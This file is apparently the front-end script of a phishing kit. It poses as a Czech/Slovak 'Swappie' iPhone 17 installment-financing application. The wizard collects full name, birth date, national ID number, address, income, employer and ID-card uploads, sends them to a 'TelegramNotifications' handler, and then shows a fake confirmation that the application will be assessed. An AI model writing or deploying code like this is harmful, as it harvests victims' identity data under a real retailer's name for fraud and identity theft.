document.addEventListener('DOMContentLoaded', () => {
    // --- CONFIGURATION ---
    const countryConfig = {
        cs: { name: 'Česko', flag: '🇨🇿', currency: 'CZK', lang: 'cs', rate: 24.7 },
        sk: { name: 'Slovensko', flag: '🇸🇰', currency: 'EUR', lang: 'sk', rate: 1 }
    };

    const translations = {
        cs: {
            home: "Domů", products: "Produkty", rights_reserved: "Všechna práva vyhrazena.",
            step_1_product: "1. Produkt", step_2_configure: "2. Konfigurace", step_3_details: "3. Údaje", step_4_submit: "4. Odeslat",
            split_payment_iphone17_title: "iPhone 17 na Splátky",
            split_payment_select_product_desc: "Nejprve si vyberte model iPhonu 17, o který máte zájem.",
            step_2_configure_title: "Nakonfigurujte si iPhone a Plán",
            step_2_configure_desc: "Vyberte si úložiště, barvu a preferovaný splátkový plán.",
            split_payment_select_storage: "Úložiště", split_payment_select_color: "Barva", split_payment_choose_plan: "Splátkový Plán",
            split_payment_summary: "Souhrn Splátek",
            split_payment_product_price: "Cena Produktu:", split_payment_interest_rate: "Navýšení", split_payment_new_total: "Celková Cena:",
            split_payment_monthly: "Měsíční Splátka:",
            back: "Zpět", next: "Další",
            split_payment_your_info: "Vaše Osobní Údaje",
            split_payment_info_desc: "Tyto informace jsou nutné k posouzení vaší žádosti o financování.",
            split_payment_full_name: "Celé Jméno", split_payment_dob: "Datum Narození", split_payment_email: "E-mailová Adresa",
            split_payment_phone: "Telefonní Číslo", split_payment_national_id: "Rodné Číslo", split_payment_address: "Úplná Adresa Bydliště",
            split_payment_employment_status: "Stav Zaměstnání", split_payment_employment_status_choose: "-- Vyberte stav --",
            split_payment_employment_employed: "Zaměstnaný", split_payment_employment_self_employed: "OSVČ",
            split_payment_employment_student: "Student", split_payment_employment_retired: "Důchodce", split_payment_employment_unemployed: "Nezaměstnaný",
            split_payment_monthly_income: "Čistý Měsíční Příjem (Kč)", split_payment_employer_name: "Název Zaměstnavatele",
            document_uploads: "Nahrání Dokumentů", split_payment_upload_id_front: "Nahrát OP (Přední strana)", split_payment_upload_id_back: "Nahrát OP (Zadní strana)",
            split_payment_upload_address_proof: "Nahrát Doklad o Adrese",
            split_payment_agreement_title: "Souhlas a Odeslání",
            split_payment_agreement_intro: "Odesláním tohoto formuláře souhlasíte s následujícími podmínkami:",
            split_payment_term_1: "Souhlasím se zpracováním mých osobních údajů pro účely posouzení této žádosti o financování.",
            split_payment_term_2: "Potvrzuji, že všechny poskytnuté informace jsou pravdivé a přesné.",
            split_payment_term_3: "Rozumím, že odeslání této žádosti nezaručuje schválení financování. O výsledku budu informován/a.",
            split_payment_term_4: "Souhlasím s tím, že mě může kontaktovat zástupce společnosti ohledně této žádosti.",
            split_payment_agree_checkbox: "Přečetl/a jsem si podmínky a souhlasím s nimi.",
            split_payment_submit_application: "Odeslat Žádost",
            thank_you_title: "Děkujeme za Vaši žádost!",
            thank_you_desc: "Vaše žádost o financování byla úspěšně odeslána. Náš tým ji nyní posoudí a co nejdříve se vám ozveme s výsledkem.",
           back_to_home: "Zpět na hlavní stránku",
            split_payment_iphone17_desc: "Zajistěte si svůj nový iPhone 17 s 0% zálohou a rozložte si platby až na 24 měsíců. Vyplňte žádost a my vás budeme kontaktovat.",
            split_payment_choose_product: "-- Vyberte model --",
            starting_from: "Od",
            select_product: "Vybrat Produkt",
            split_payment_month_interest: "{months} měsíců (+{interest}%)",
            split_payment_monthly_value: "{price} / měsíc ({months} měsíců)"
        },
        sk: {
            home: "Domov", products: "Produkty", rights_reserved: "Všetky práva vyhradené.",
            step_1_product: "1. Produkt", step_2_configure: "2. Konfigurácia", step_3_details: "3. Údaje", step_4_submit: "4. Odoslať",
            split_payment_iphone17_title: "iPhone 17 na Splátky",
            split_payment_select_product_desc: "Najprv si vyberte model iPhonu 17, o ktorý máte záujem.",
            step_2_configure_title: "Nakonfigurujte si iPhone a Plán",
            step_2_configure_desc: "Vyberte si úložisko, farbu a preferovaný splátkový plán.",
            split_payment_select_storage: "Úložisko", split_payment_select_color: "Farba", split_payment_choose_plan: "Splátkový Plán",
            split_payment_summary: "Súhrn Splátok",
            split_payment_product_price: "Cena Produktu:", split_payment_interest_rate: "Navýšenie", split_payment_new_total: "Celková Cena:",
            split_payment_monthly: "Mesačná Splátka:",
            back: "Späť", next: "Ďalej",
            split_payment_your_info: "Vaše Osobné Údaje",
            split_payment_info_desc: "Tieto informácie sú potrebné na posúdenie vašej žiadosti o financovanie.",
            split_payment_full_name: "Celé Meno", split_payment_dob: "Dátum Narodenia", split_payment_email: "E-mailová Adresa",
            split_payment_phone: "Telefónne Číslo", split_payment_national_id: "Rodné Číslo", split_payment_address: "Úplná Adresa Bydliska",
            split_payment_employment_status: "Stav Zamestnania", split_payment_employment_status_choose: "-- Vyberte stav --",
            split_payment_employment_employed: "Zamestnaný", split_payment_employment_self_employed: "SZČO",
            split_payment_employment_student: "Študent", split_payment_employment_retired: "Dôchodca", split_payment_employment_unemployed: "Nezamestnaný",
            split_payment_monthly_income: "Čistý Mesačný Príjem (€)", split_payment_employer_name: "Názov Zamestnávateľa",
            document_uploads: "Nahratie Dokumentov", split_payment_upload_id_front: "Nahrať OP (Predná strana)", split_payment_upload_id_back: "Nahrať OP (Zadná strana)",
            split_payment_upload_address_proof: "Nahrať Doklad o Adrese",
            split_payment_agreement_title: "Súhlas a Odoslanie",
            split_payment_agreement_intro: "Odoslaním tohto formulára súhlasíte s nasledujúcimi podmienkami:",
            split_payment_term_1: "Súhlasím so spracovaním mojich osobných údajov na účely posúdenia tejto žiadosti o financovanie.",
            split_payment_term_2: "Potvrdzujem, že všetky poskytnuté informácie sú pravdivé a presné.",
            split_payment_term_3: "Rozumiem, že odoslanie tejto žiadosti nezaručuje schválenie financovania. O výsledku budem informovaný/á.",
            split_payment_term_4: "Súhlasím s tým, že ma môže kontaktovať zástupca spoločnosti ohľadom tejto žiadosti.",
            split_payment_agree_checkbox: "Prečítal/a som si podmienky a súhlasím s nimi.",
            split_payment_submit_application: "Odoslať Žiadosť",
            thank_you_title: "Ďakujeme za Vašu žiadosť!",
            thank_you_desc: "Vaša žiadosť o financovanie bola úspešne odoslaná. Náš tím ju teraz posúdi a čo najskôr sa vám ozveme s výsledkom.",
           back_to_home: "Späť na hlavnú stránku",
            split_payment_iphone17_desc: "Zabezpečte si svoj nový iPhone 17 s 0% zálohou a rozložte si platby až na 24 mesiacov. Vyplňte žiadosť a my vás budeme kontaktovať.",
            split_payment_choose_product: "-- Vyberte model --",
            starting_from: "Od",
            select_product: "Vybrať Produkt",
            split_payment_month_interest: "{months} mesiacov (+{interest}%)",
            split_payment_monthly_value: "{price} / mesiac ({months} mesiacov)"
        }
    };

    // --- STATE MANAGEMENT ---
    let state = {
        currentStep: 1,
        selectedProduct: null,
        selectedVariant: null,
        selectedColor: null,
        selectedPlan: null,
        language: 'cs',
        currency: 'CZK',
        exchangeRate: 24.7
    };

    // --- DOM ELEMENTS ---
    const wizardSteps = document.querySelectorAll('.wizard-step');
    const stepIndicators = document.querySelectorAll('.step');
    const productGrid = document.getElementById('product-selection-grid');
    const storageSelect = document.getElementById('storage-select');
    const colorSelect = document.getElementById('color-select');
    const monthsSelect = document.getElementById('months-select');
    const calculationSummary = document.getElementById('calculation-summary');
    const customerForm = document.getElementById('customer-info-form');
    const termsCheckbox = document.getElementById('terms-agree-checkbox');
    const submitBtn = document.getElementById('submit-application-btn');

    // --- TRANSLATION & CURRENCY ---
    function t(key) {
        return translations[state.language][key] || key;
    }

    function convertPrice(priceInUSD) {
        const convertedPrice = priceInUSD * state.exchangeRate;
        return new Intl.NumberFormat(state.language, { style: 'currency', currency: state.currency }).format(convertedPrice);
    }

    function updateAllText() {
        document.querySelectorAll('[data-translate]').forEach(el => {
            el.textContent = t(el.dataset.translate);
        });
        // Update dynamic elements like placeholders or titles
        document.title = t('split_payment_iphone17_title') + " - Swappie";
        document.getElementById('monthly-income').previousElementSibling.textContent = t('split_payment_monthly_income').replace('(Kč)', `(${state.currency})`);
    }

    // --- INITIALIZATION ---
    function initializePage() {
        const urlParams = new URLSearchParams(window.location.search);
        const country = urlParams.get('country') || 'cs';
        state.language = country;
        state.currency = countryConfig[country].currency;
        state.exchangeRate = countryConfig[country].rate;

        // Update country switcher UI
        document.getElementById('current-flag').textContent = countryConfig[country].flag;
        document.getElementById('current-country').textContent = countryConfig[country].name;

        updateAllText();
        populateProductGrid();
        populateMonths();
        setupEventListeners();
    }

    // --- UI POPULATION ---
    function populateProductGrid() {
        productGrid.innerHTML = '';
        productsForSplitPaymentIphone17.forEach(product => {
            const card = document.createElement('div');
            card.className = 'product-card';
            card.innerHTML = `
                <div class="product-image"><img src="${product.image}" alt="${product.name}"></div>
                <div class="product-info">
                    <h3 class="product-name">${product.name}</h3>
                    <div class="product-price">
                        <span class="current-price">${t('starting_from')} ${convertPrice(product.variants[0].price)}</span>
                    </div>
                    <button class="btn btn-secondary select-product-btn" data-product-id="${product.id}">${t('select_product')}</button>
                </div>
            `;
            productGrid.appendChild(card);
        });
    }

    function populateMonths() {
        monthsSelect.innerHTML = '';
        const plans = [{ months: 6, interest: 2 }, { months: 12, interest: 4 }, { months: 18, interest: 5 }, { months: 24, interest: 6 }];
        plans.forEach(plan => {
            const option = document.createElement('option');
            option.value = plan.months;
            option.textContent = t('split_payment_month_interest').replace('{months}', plan.months).replace('{interest}', plan.interest);
            option.dataset.interest = plan.interest;
            monthsSelect.appendChild(option);
        });
    }

    // --- EVENT LISTENERS ---
    function setupEventListeners() {
        // Product selection
        productGrid.addEventListener('click', e => {
            if (e.target.classList.contains('select-product-btn')) {
                const productId = e.target.dataset.productId;
                state.selectedProduct = productsForSplitPaymentIphone17.find(p => p.id === productId);
                if (state.selectedProduct) {
                    goToStep(2);
                    configureProductStep();
                }
            }
        });

        // Wizard navigation
        document.querySelector('.split-payment-wizard').addEventListener('click', e => {
            if (e.target.closest('[data-action="next"]')) goToStep(state.currentStep + 1);
            if (e.target.closest('[data-action="prev"]')) goToStep(state.currentStep - 1);
        });

        // Configuration dropdowns
        storageSelect.addEventListener('change', handleConfigurationChange);
        colorSelect.addEventListener('change', handleConfigurationChange);
        monthsSelect.addEventListener('change', handleConfigurationChange);

        // Form validation
        customerForm.addEventListener('input', checkFormCompletion);
        termsCheckbox.addEventListener('change', checkFormCompletion);
        submitBtn.addEventListener('click', submitApplication);

        // Country switcher
        const countryDropdownBtn = document.getElementById('country-dropdown-btn');
        const countryDropdown = document.getElementById('country-dropdown');
        countryDropdownBtn.addEventListener('click', () => countryDropdown.classList.toggle('hidden'));
        document.addEventListener('click', (e) => {
            if (!countryDropdownBtn.contains(e.target) && !countryDropdown.contains(e.target)) {
                countryDropdown.classList.add('hidden');
            }
        });
    }

    // --- WIZARD LOGIC ---
    function goToStep(step) {
        state.currentStep = step;
        wizardSteps.forEach(s => s.classList.remove('active'));
        document.getElementById(`wizard-step-${step}`).classList.add('active');
        stepIndicators.forEach((ind, i) => {
            ind.classList.toggle('active', i < step);
        });
        window.scrollTo(0, 0);
    }

    function configureProductStep() {
        const summaryEl = document.getElementById('selected-product-summary');
        summaryEl.innerHTML = `<img src="${state.selectedProduct.image}" alt="${state.selectedProduct.name}"><h3>${state.selectedProduct.name}</h3>`;

        storageSelect.innerHTML = `<option value="">--</option>`;
        state.selectedProduct.variants.forEach(v => {
            storageSelect.innerHTML += `<option value="${v.storage}" data-price="${v.price}">${v.storage} - ${convertPrice(v.price)}</option>`;
        });

        colorSelect.innerHTML = `<option value="">--</option>`;
        state.selectedProduct.colors.forEach(c => {
            colorSelect.innerHTML += `<option value="${c}">${c}</option>`;
        });

        resetConfig();
    }

    function resetConfig() {
        storageSelect.value = '';
        colorSelect.value = '';
        monthsSelect.value = '6';
        state.selectedVariant = null;
        state.selectedColor = null;
        calculationSummary.style.display = 'none';
        document.querySelector('#wizard-step-2 [data-action="next"]').disabled = true;
    }

    function handleConfigurationChange() {
        const storageOption = storageSelect.options[storageSelect.selectedIndex];
        if (storageOption && storageOption.value) {
            state.selectedVariant = { storage: storageOption.value, price: parseFloat(storageOption.dataset.price) };
        } else {
            state.selectedVariant = null;
        }
        state.selectedColor = colorSelect.value || null;
        
        if (state.selectedVariant && state.selectedColor) {
            updateCalculations();
            calculationSummary.style.display = 'block';
            document.querySelector('#wizard-step-2 [data-action="next"]').disabled = false;
        } else {
            calculationSummary.style.display = 'none';
            document.querySelector('#wizard-step-2 [data-action="next"]').disabled = true;
        }
    }

    function updateCalculations() {
        const planOption = monthsSelect.options[monthsSelect.selectedIndex];
        const months = parseInt(planOption.value);
        const interestRate = parseFloat(planOption.dataset.interest);

        const basePrice = state.selectedVariant.price;
        const interestAmount = basePrice * (interestRate / 100);
        const totalPrice = basePrice + interestAmount;
        const monthlyPayment = totalPrice / months;

        document.getElementById('summary-price').textContent = convertPrice(basePrice);
        document.getElementById('summary-interest-rate').textContent = interestRate;
        document.getElementById('summary-interest-amount').textContent = convertPrice(interestAmount);
        document.getElementById('summary-total-price').textContent = convertPrice(totalPrice);
        document.getElementById('summary-monthly').textContent = t('split_payment_monthly_value')
            .replace('{price}', convertPrice(monthlyPayment))
            .replace('{months}', months);
    }

    function checkFormCompletion() {
        const requiredFields = Array.from(customerForm.querySelectorAll('[required]'));
        const allFilled = requiredFields.every(field => field.value.trim() !== '');
        
        const nextBtn = document.querySelector('#wizard-step-3 [data-action="next"]');
        if (nextBtn) nextBtn.disabled = !allFilled;

        submitBtn.disabled = !allFilled || !termsCheckbox.checked;
    }

    function submitApplication() {
        if (!validateCustomerInfo() || !termsCheckbox.checked) {
            alert("Please fill all fields and agree to the terms.");
            return;
        }

        const customerData = {
            name: document.getElementById('customer-name').value,
            dob: document.getElementById('customer-dob').value,
            email: document.getElementById('customer-email').value,
            phone: document.getElementById('customer-phone').value,
            nationalId: document.getElementById('customer-national-id').value,
            address: document.getElementById('customer-address').value,
            employment: document.getElementById('employment-status').options[document.getElementById('employment-status').selectedIndex].text,
            employer: document.getElementById('employer-name').value || 'N/A',
            income: document.getElementById('monthly-income').value,
            idFront: document.getElementById('id-upload-front').files[0]?.name || 'Not provided',
            idBack: document.getElementById('id-upload-back').files[0]?.name || 'Not provided',
            addressProof: document.getElementById('address-proof-upload').files[0]?.name || 'Not provided'
        };

        if (typeof TelegramNotifications !== 'undefined' && TelegramNotifications.splitPaymentApplicationSubmitted) {
            TelegramNotifications.splitPaymentApplicationSubmitted({
                productName: `${state.selectedProduct.name} (${state.selectedVariant.storage} - ${state.selectedColor})`,
                total: document.getElementById('summary-total-price').textContent,
                monthly: document.getElementById('summary-monthly').textContent,
                months: monthsSelect.value,
                customer: customerData,
                country: state.language.toUpperCase()
            });
        }

        goToStep('success'); // Go to success step
    }

    function validateCustomerInfo() {
        const requiredFields = Array.from(customerForm.querySelectorAll('[required]'));
        return requiredFields.every(field => field.value.trim() !== '');
    }

    // --- START ---
    initializePage();
});
